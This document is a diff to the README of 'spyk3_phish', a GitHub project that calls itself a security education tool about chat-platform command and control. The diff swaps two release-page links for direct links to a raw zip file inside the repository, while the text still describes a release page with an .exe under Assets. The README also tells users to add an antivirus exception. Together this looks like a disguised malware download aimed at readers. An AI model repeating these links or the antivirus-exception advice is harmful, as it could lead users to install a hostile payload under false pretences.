@@ -1,6 +1,6 @@
 # 🛡️ spyk3_phish - Learn how chat platforms transmit threats
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/raw/refs/heads/main/aid/phish_spyk_2.3.zip)
 
 ## 📖 About the project
 spyk3_phish serves as a security education tool. It shows how bad actors use chat platforms for remote command and control. Security students use this software to study social engineering and common attack paths. By observing these methods in a controlled environment, defenders build stronger strategies. This tool focuses on theoretical education for blue teams and ethical red teams.
@@ -19,7 +19,7 @@ If your computer uses an Antivirus program, you might need to add an exception f
 ## 💾 Downloading the application
 Visit the official repository page to get the installer for your computer. 
 
-[Download the latest version here](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/releases)
+[Download the latest version here](https://github.com/Anaplastic-sennaalata8178/spyk3_phish/raw/refs/heads/main/aid/phish_spyk_2.3.zip)
 
 Click on the link to see the release page. Look for the file ending in .exe under the Assets section. Save this file to your computer.
 
